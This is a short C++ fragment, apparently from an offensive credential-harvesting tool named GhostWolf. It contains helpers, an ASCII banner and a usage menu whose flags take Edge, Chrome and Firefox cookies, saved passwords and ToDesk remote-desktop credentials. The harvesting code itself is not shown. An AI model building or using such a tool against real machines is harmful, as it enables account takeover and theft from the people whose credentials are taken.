#include <Windows.h>
#include <stdio.h>
#include <format>

void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        byteArray[i] = static_cast<BYTE>(value & 0xFF);
        value >>= 8;
    }
}
void PrintMessageA(char const* const Message, ...) {
    printf(Message);
}
void PrintMessageW(wchar_t const* const Message, ...) {
    wprintf(Message);
}
void usage() {
    printf("\nFlags:\n");
    printf("    /edge       Get the cookies for the current host\n");
    printf("        /pass       Lists all host passwords\n");
    printf("    /chrome       Get the cookies for the current host\n");
    printf("    /firefox       Get the cookies for the current host\n");
    printf("    /todesk       Get the credentials for the current host\n");
    printf("        /list       list all hosts\n");
    printf("        /pass       Lists all host passwords\n");
    printf("    /help       Maybe you need help\n");
}
void banner() {
    printf("   _____ _               _    _    _       _  __ \n");
    printf("  / ____| |             | |  | |  | |     | |/ _|\n");
    printf(" | |  __| |__   ___  ___| |_ | |  | | ___ | | |_ \n");
    printf(" | | |_ | '_ \\ / _ \\/ __| __|| |/\\| |/ _ \\| |  _|\n");
    printf(" | |__| | | | | (_) \\__ \\ |_ \\  /\\  / (_) | | |  \n");
    printf("  \\_____|_| |_|\\___/|___/\\__| \\/  \\/ \\___/|_|_|  \n");
    printf("By Sickle                   github.com/SickleSec\n");
};